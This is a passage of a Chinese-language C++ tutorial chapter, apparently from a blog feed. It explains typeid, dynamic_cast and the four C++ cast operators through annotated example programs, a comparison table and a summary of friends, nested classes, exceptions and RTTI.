class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // for typeid, type_info</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用上面定义的 Grand, Superb, Magnificent 类和 GetOne() 函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line">    Grand * pg = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        pg = GetOne();</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer pg type (static): &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指针本身的类型</span></span><br><span class="line">        <span class="keyword">if</span> (pg != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="comment">// 对指针解引用，获取运行时类型信息 (因为 Grand 有虚函数)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object pointed to by pg (runtime): &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(*pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 比较类型信息</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Grand)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Grand object.\n&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Superb)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Superb object.\n&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Magnificent)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Magnificent object.\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查是否是某种类型或其派生类 (通常 dynamic_cast 更适合)</span></span><br><span class="line">            <span class="comment">// 注意：typeid 比较的是精确类型，不会考虑继承关系</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">dynamic_cast</span>&lt;Superb*&gt;(pg)) &#123; <span class="comment">// 检查是否是 Superb 或其派生类</span></span><br><span class="line">                 <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s a Superb or derived from Superb.\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">delete</span> pg;</span><br><span class="line">            pg = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对空指针使用 typeid 会抛异常</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of *nullptr: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(*pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_typeid&amp; bt) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught bad_typeid exception: &quot;</span> &lt;&lt; bt.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>dynamic_cast</code> vs <code>typeid</code>:</strong></p><ul><li>  <code>dynamic_cast</code> 主要用于<strong>安全的类型转换</strong>，并检查对象是否<strong>属于</strong>某个类型或其派生类。</li><li>  <code>typeid</code> 主要用于获取对象的<strong>精确类型信息</strong>并进行比较。它不直接用于类型转换。</li></ul><p>在需要根据类型执行不同操作时，如果这些操作可以通过虚函数实现，则优先使用虚函数。如果必须进行向下转换，<code>dynamic_cast</code> 通常是比 <code>typeid</code> 结合 <code>static_cast</code> 更安全的选择。</p><p><strong>RTTI 和编译器选项:</strong></p><p>某些编译器可能提供禁用 RTTI 的选项，以减少代码大小或运行时开销。如果禁用了 RTTI，<code>dynamic_cast</code> 和 <code>typeid</code> 的行为可能会改变或导致编译错误。</p><h2 id="15-5-类型转换运算符"><a href="#15-5-类型转换运算符" class="headerlink" title="15.5 类型转换运算符"></a>15.5 类型转换运算符</h2><p>C++ 继承了 C 语言的类型转换语法（例如 <code>(TypeName) expression</code> 或 <code>TypeName(expression)</code>）。然而，这种 C 风格的强制类型转换过于粗放，难以在代码中查找，并且无法区分不同类型的转换意图（例如，是去除 <code>const</code> 属性，还是在相关类型间转换，或是完全重新解释比特位）。</p><p>为了提供更安全、更明确的类型转换方式，C++ 引入了四个**类型转换运算符 (Type Cast Operators)**：</p><ul><li>  <code>static_cast&lt;&gt;()</code></li><li>  <code>const_cast&lt;&gt;()</code></li><li>  <code>reinterpret_cast&lt;&gt;()</code></li><li>  <code>dynamic_cast&lt;&gt;()</code> (已在 15.4 RTTI 中详细介绍)</li></ul><p>这些运算符具有统一的语法格式：<code>cast_name&lt;TargetType&gt;(expression)</code>。它们使转换意图更加清晰，并且允许编译器进行更严格的检查。</p><h3 id="1-static-cast-lt-TargetType-gt-expression"><a href="#1-static-cast-lt-TargetType-gt-expression" class="headerlink" title="1. static_cast&lt;TargetType&gt;(expression)"></a>1. <code>static_cast&lt;TargetType&gt;(expression)</code></h3><p><code>static_cast</code> 用于<strong>比较“自然”和“合理”</strong>的类型转换，主要是在相关类型之间进行转换，或者执行编译器能够理解的标准转换。它在<strong>编译时</strong>进行类型检查。</p><p><strong>主要用途:</strong></p><ul><li><strong>相关类型转换:</strong><ul><li>  在类层次结构中进行<strong>向上转换</strong>（派生类指针/引用 -&gt; 基类指针/引用）。这是安全的，虽然通常隐式转换即可。</li><li>  在类层次结构中进行<strong>向下转换</strong>（基类指针/引用 -&gt; 派生类指针/引用）。<strong>不安全！</strong> <code>static_cast</code> 不进行运行时类型检查。如果基类指针实际指向的不是目标派生类对象，使用转换后的指针会导致未定义行为。只有当你<strong>确定</strong>指针确实指向目标类型时，才应使用 <code>static_cast</code> 进行向下转换（<code>dynamic_cast</code> 是更安全的选择）。</li></ul></li><li>  <strong>基本数据类型转换:</strong> 在数字类型之间进行转换（如 <code>int</code> 到 <code>float</code>, <code>double</code> 到 <code>int</code>）。</li><li>  <strong>枚举与整型转换:</strong> 在枚举类型和整型或浮点类型之间转换。</li><li>  <strong><code>void*</code> 转换:</strong> 将任何类型的指针转换为 <code>void*</code>，或将 <code>void*</code> 转换回原始类型的指针（或兼容类型的指针）。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span> <span class="keyword">public</span>: <span class="keyword">virtual</span> ~Base() &#123;&#125; &#125;; <span class="comment">// 多态基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基本类型转换</span></span><br><span class="line">    <span class="keyword">double</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="keyword">int</span> integer_pi = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(pi); <span class="comment">// double to int (截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;integer_pi: &quot;</span> &lt;&lt; integer_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向上转换 (安全)</span></span><br><span class="line">    Derived d;</span><br><span class="line">    Base* pb = &amp;d; <span class="comment">// 隐式转换即可</span></span><br><span class="line">    Base* pb_static = <span class="keyword">static_cast</span>&lt;Base*&gt;(&amp;d); <span class="comment">// 显式向上转换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向下转换 (不安全，需程序员保证)</span></span><br><span class="line">    Base* pb_maybe_d = <span class="keyword">new</span> Derived();</span><br><span class="line">    <span class="comment">// 假设我们确定 pb_maybe_d 指向 Derived</span></span><br><span class="line">    Derived* pd_static = <span class="keyword">static_cast</span>&lt;Derived*&gt;(pb_maybe_d);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Static downcast successful (programmer assumed).\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> pb_maybe_d;</span><br><span class="line"></span><br><span class="line">    Base* pb_not_d = <span class="keyword">new</span> Base();</span><br><span class="line">    <span class="comment">// !! 危险 !! pb_not_d 实际指向 Base，但我们强制转为 Derived*</span></span><br><span class="line">    <span class="comment">// Derived* pd_wrong = static_cast&lt;Derived*&gt;(pb_not_d);</span></span><br><span class="line">    <span class="comment">// pd_wrong-&gt;someDerivedMethod(); // *** 未定义行为 ***</span></span><br><span class="line">    <span class="keyword">delete</span> pb_not_d;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void* 转换</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">void</span>* vp = <span class="keyword">static_cast</span>&lt;<span class="keyword">void</span>*&gt;(&amp;i); <span class="comment">// int* to void*</span></span><br><span class="line">    <span class="keyword">int</span>* ip = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>*&gt;(vp);   <span class="comment">// void* back to int*</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via void*: &quot;</span> &lt;&lt; *ip &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-const-cast-lt-TargetType-gt-expression"><a href="#2-const-cast-lt-TargetType-gt-expression" class="headerlink" title="2. const_cast&lt;TargetType&gt;(expression)"></a>2. <code>const_cast&lt;TargetType&gt;(expression)</code></h3><p><code>const_cast</code> 是唯一能够<strong>移除 (cast away)</strong> 或<strong>添加</strong> <code>const</code> 或 <code>volatile</code> 限定符的 C++ 转换运算符。</p><p><strong>主要用途:</strong></p><ul><li>  <strong>移除 <code>const</code>:</strong> 当你有一个指向 <code>const</code> 数据的指针或引用，但你需要调用一个<strong>不接受 <code>const</code> 参数</strong>（但实际上<strong>不会修改</strong>数据）的函数时，可以使用 <code>const_cast</code> 临时移除 <code>const</code> 属性。</li><li>  <strong>添加 <code>const</code>:</strong> 虽然不常用，但也可以用来添加 <code>const</code> 属性。</li></ul><p><strong>重要警告:</strong></p><ul><li>  <code>const_cast</code> 只能改变指针或引用的 <code>const</code>/<code>volatile</code> 属性，<strong>不能</strong>改变表达式的类型。例如，不能用 <code>const_cast</code> 将 <code>const char*</code> 转换为 <code>int*</code>。</li><li>  通过 <code>const_cast</code> 移除 <code>const</code> 属性后，如果<strong>原始对象</strong>本身就是 <code>const</code> 的，那么试图通过转换后的指针或引用去<strong>修改</strong>该对象的值，将导致**未定义行为 (Undefined Behavior)**！<code>const_cast</code> 主要用于处理接口不匹配的情况，而不是用来破坏常量性。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设有一个旧的 C 函数，它接受 char* 但保证不修改内容</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">legacy_print</span><span class="params">(<span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Legacy print: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* const_message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 legacy_print 需要 char*，但我们只有 const char*</span></span><br><span class="line">    <span class="comment">// 我们知道 legacy_print 不会修改，所以使用 const_cast</span></span><br><span class="line">    <span class="keyword">char</span>* non_const_message = <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span>*&gt;(const_message);</span><br><span class="line">    legacy_print(non_const_message); <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> constant_value = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span>* p_const = &amp;constant_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试移除 const 并修改</span></span><br><span class="line">    <span class="keyword">int</span>* p_non_const = <span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>*&gt;(p_const);</span><br><span class="line">    <span class="comment">// *p_non_const = 200; // *** 未定义行为！*** 因为 constant_value 本身是 const</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> variable_value = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span>* p_const_var = &amp;variable_value;</span><br><span class="line">    <span class="keyword">int</span>* p_non_const_var = <span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>*&gt;(p_const_var);</span><br><span class="line">    *p_non_const_var = <span class="number">60</span>; <span class="comment">// OK，因为 variable_value 本身不是 const</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;variable_value: &quot;</span> &lt;&lt; variable_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 60</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-reinterpret-cast-lt-TargetType-gt-expression"><a href="#3-reinterpret-cast-lt-TargetType-gt-expression" class="headerlink" title="3. reinterpret_cast&lt;TargetType&gt;(expression)"></a>3. <code>reinterpret_cast&lt;TargetType&gt;(expression)</code></h3><p><code>reinterpret_cast</code> 用于执行<strong>低级别</strong>的、可能不安全的类型转换。它本质上只是要求编译器<strong>重新解释</strong>表达式的**比特模式 (bit pattern)**，将其视为 <code>TargetType</code> 类型。它很少进行实际的转换，更多的是一种编译时的指令。</p><p><strong>主要用途:</strong></p><ul><li>  <strong>指针与整型转换:</strong> 在指针类型和足够大的整型（如 <code>uintptr_t</code>）之间进行转换。</li><li>  <strong>不相关指针类型转换:</strong> 在不相关的指针类型之间进行转换（例如，<code>int*</code> 到 <code>char*</code>）。这是非常危险的操作，通常只在需要对原始内存进行底层操作时使用。</li><li>  <strong>函数指针转换:</strong> 在不同的函数指针类型之间转换（同样非常危险）。</li></ul><p><strong>重要警告:</strong></p><ul><li>  <code>reinterpret_cast</code> 的行为是<strong>高度依赖于具体实现和平台</strong>的。</li><li>  使用 <code>reinterpret_cast</code> 进行的转换几乎总是<strong>不可移植</strong>的。</li><li>  滥用 <code>reinterpret_cast</code> 极易导致<strong>未定义行为</strong>和难以调试的错误。</li><li>  它应该只在绝对必要且完全理解其后果的情况下使用，通常用于与底层硬件或旧的 C 代码交互。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt; // for uintptr_t</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">65</span>; <span class="comment">// ASCII &#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针类型转换 (危险)</span></span><br><span class="line">    <span class="keyword">int</span>* pi = &amp;i;</span><br><span class="line">    <span class="comment">// 将 int* 重新解释为 char*</span></span><br><span class="line">    <span class="keyword">char</span>* pc = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(pi);</span><br><span class="line">    <span class="comment">// 结果取决于系统字节序 (endianness)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reinterpreted char: &quot;</span> &lt;&lt; *pc &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能输出 &#x27;A&#x27; 或其他</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针与整数转换</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> addr_val = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uintptr_t</span>&gt;(pi); <span class="comment">// 指针转整数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address as integer: &quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; addr_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span>* pi_back = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>*&gt;(addr_val); <span class="comment">// 整数转回指针</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via int-&gt;ptr-&gt;int: &quot;</span> &lt;&lt; <span class="built_in">std</span>::dec &lt;&lt; *pi_back &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 65</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不相关指针类型转换 (非常危险)</span></span><br><span class="line">    Data d = &#123;<span class="number">1</span>, <span class="number">3.14</span>&#125;;</span><br><span class="line">    Data* pd = &amp;d;</span><br><span class="line">    <span class="comment">// 将 Data* 重新解释为 int*</span></span><br><span class="line">    <span class="keyword">int</span>* p_int_from_data = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>*&gt;(pd);</span><br><span class="line">    <span class="comment">// 访问 *p_int_from_data 通常会得到 d.a 的值 (取决于内存布局)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reinterpreted int from Data*: &quot;</span> &lt;&lt; *p_int_from_data &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能输出 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-dynamic-cast-lt-TargetType-gt-expression"><a href="#4-dynamic-cast-lt-TargetType-gt-expression" class="headerlink" title="4. dynamic_cast&lt;TargetType&gt;(expression)"></a>4. <code>dynamic_cast&lt;TargetType&gt;(expression)</code></h3><p><code>dynamic_cast</code> 用于在具有<strong>虚函数</strong>的类层次结构中进行<strong>安全的向下转换</strong>。它在<strong>运行时</strong>检查转换的有效性。</p><ul><li>  <strong>指针转换:</strong> 如果转换无效，返回 <code>nullptr</code>。</li><li>  <strong>引用转换:</strong> 如果转换无效，抛出 <code>std::bad_cast</code> 异常。</li></ul><p>(详细内容请参考 15.4 RTTI)</p><h3 id="总结比较"><a href="#总结比较" class="headerlink" title="总结比较"></a>总结比较</h3><table><thead><tr><th align="left">运算符</th><th align="left">主要用途</th><th align="left">安全性</th><th align="left">运行时检查</th><th align="left">对 <code>const</code>/<code>volatile</code></th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><code>static_cast</code></td><td align="left">相关类型转换、数值转换、<code>void*</code> 转换</td><td align="left">相对安全</td><td align="left">否</td><td align="left">不能移除</td><td align="left">向下转换不安全</td></tr><tr><td align="left"><code>const_cast</code></td><td align="left">移除或添加 <code>const</code>/<code>volatile</code></td><td align="left">低 (易未定义行为)</td><td align="left">否</td><td align="left">唯一能操作</td><td align="left">不能改变基本类型，修改 const 对象是未定义行为</td></tr><tr><td align="left"><code>reinterpret_cast</code></td><td align="left">低级别位模式重新解释、指针整数互转、不相关指针互转</td><td align="left">非常低</td><td align="left">否</td><td align="left">不能移除</td><td align="left">依赖实现、不可移植、极易出错</td></tr><tr><td align="left"><code>dynamic_cast</code></td><td align="left">安全的向下转换（多态类型）</td><td align="left">高</td><td align="left">是</td><td align="left">不能移除</td><td align="left">需要虚函数，失败时返回 <code>nullptr</code> 或抛异常</td></tr></tbody></table><p><strong>使用原则:</strong></p><ul><li>  优先使用隐式转换和虚函数。</li><li>  当需要显式转换时，选择意图最明确、限制最严格的转换运算符。</li><li>  尽量使用 <code>static_cast</code> 进行“合理”的转换。</li><li>  只在需要改变 <code>const</code>/<code>volatile</code> 属性时使用 <code>const_cast</code>，并确保不修改原始 <code>const</code> 对象。</li><li>  避免使用 <code>reinterpret_cast</code>，除非绝对必要且完全理解后果。</li><li>  在多态类型向下转换时，优先使用 <code>dynamic_cast</code> 以确保安全。</li></ul><h2 id="15-6-总结"><a href="#15-6-总结" class="headerlink" title="15.6 总结"></a>15.6 总结</h2><p>本章探讨了 C++ 中一些高级特性和处理特殊情况的技术，包括友元、嵌套类、异常处理和运行时类型识别（RTTI）以及类型转换运算符。这些工具提供了更精细的控制和更强大的错误处理能力。</p><p>主要内容回顾：</p><ol><li><p><strong>友元 (Friends):</strong></p><ul><li>  允许特定的外部函数（<strong>友元函数</strong>）、类（<strong>友元类</strong>）或成员函数（<strong>友元成员函数</strong>）访问一个类的 <code>private</code> 和 <code>protected</code> 成员。</li><li>  通过在宿主类中使用 <code>friend</code> 关键字声明。</li><li>  友元关系不是传递的，也不是对称的。</li><li>  友元破坏了封装性，应谨慎使用，通常用于重载运算符（如 <code>&lt;&lt;</code>）或实现紧密协作的类。</li></ul></li><li><p><strong>嵌套类 (Nested Classes):</strong></p><ul><li>  在一个类（外围类）内部定义的类。</li><li>  作用域局限于外围类，外部访问需使用作用域解析符 (<code>Enclosing::Nested</code>)。</li><li>  嵌套类可以访问外围类的所有成员（通过对象、指针或引用）。</li><li>  外围类访问嵌套类成员受嵌套类自身访问控制限制。</li><li>  常用于实现与外围类相关的辅助类或隐藏实现细节。</li></ul></li><li><p><strong>异常处理 (Exceptions):</strong></p><ul><li>  一种结构化的错误处理机制，用于处理运行时发生的异常情况。</li><li>  使用 <code>try</code> 块包围可能抛出异常的代码，<code>throw</code> 语句抛出异常，<code>catch</code> 块捕获并处理异常。</li><li>  相比错误码或 <code>abort()</code>，异常能更好地分离错误检测和处理，自动沿调用栈传播。</li><li>  推荐使用<strong>类对象</strong>（最好继承自 <code>std::exception</code>）作为异常类型，可以携带更多信息并利用继承进行分类处理。</li><li>  <strong>栈解退 (Stack Unwinding):</strong> 异常发生时，局部对象按构造相反顺序销毁，其析构函数被调用，是 RAII 实现资源安全的关键。</li><li>  <strong><code>noexcept</code> (C++11):</strong> 用于声明函数保证不抛出异常，有助于优化和异常安全保证。析构函数应为 <code>noexcept</code>。</li><li>  <strong><code>throw;</code></strong> 用于在 <code>catch</code> 块中重新抛出当前异常。</li><li>  <strong><code>catch(...)</code></strong> 用于捕获任何类型的异常。</li><li>  异常处理有性能开销，适用于处理<strong>异常</strong>而非常规流程。</li></ul></li><li><p><strong>RTTI (运行时类型识别):</strong></p><ul><li>  允许程序在运行时查询对象的实际类型信息。</li><li>  主要用于具有<strong>虚函数</strong>的多态类层次结构。</li><li>  <strong><code>dynamic_cast&lt;&gt;</code>:</strong> 用于安全的向下转换。对指针转换失败返回 <code>nullptr</code>；对引用转换失败抛出 <code>std::bad_cast</code>。</li><li>  <strong><code>typeid()</code>:</strong> 返回对象的类型信息 (<code>std::type_info</code> 对象），可用于比较精确类型。对空指针操作抛出 <code>std::bad_typeid</code>。</li><li>  <strong><code>std::type_info</code>:</strong> 提供 <code>name()</code> 方法获取类型名称（格式依赖实现）和比较运算符。</li><li>  应优先使用虚函数实现多态，RTTI 作为补充或特定场景下的解决方案。</li></ul></li><li><p><strong>类型转换运算符:</strong></p><ul><li>  C++ 提供了四个显式类型转换运算符，比 C 风格转换更安全、意图更明确。</li><li>  <strong><code>static_cast&lt;&gt;</code>:</strong> 用于相关的、编译时可检查的转换（数值、向上转换、不安全的向下转换、<code>void*</code>）。</li><li>  <strong><code>const_cast&lt;&gt;</code>:</strong> 唯一能移除或添加 <code>const</code>/<code>volatile</code> 的转换符。修改原始 <code>const</code> 对象是未定义行为。</li><li>  <strong><code>reinterpret_cast&lt;&gt;</code>:</strong> 低级别位模式重新解释，用于不相关指针转换、指针整数互转等。非常危险，不可移植。</li><li>  <strong><code>dynamic_cast&lt;&gt;</code>:</strong> 用于多态类型安全的运行时向下转换。</li></ul></li></ol><p>本章介绍的特性为处理类间关系、错误恢复和类型查询提供了更多工具，但也带来了复杂性。理解它们的原理、适用场景和潜在风险对于编写健壮、高效的 C++ 程序非常重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
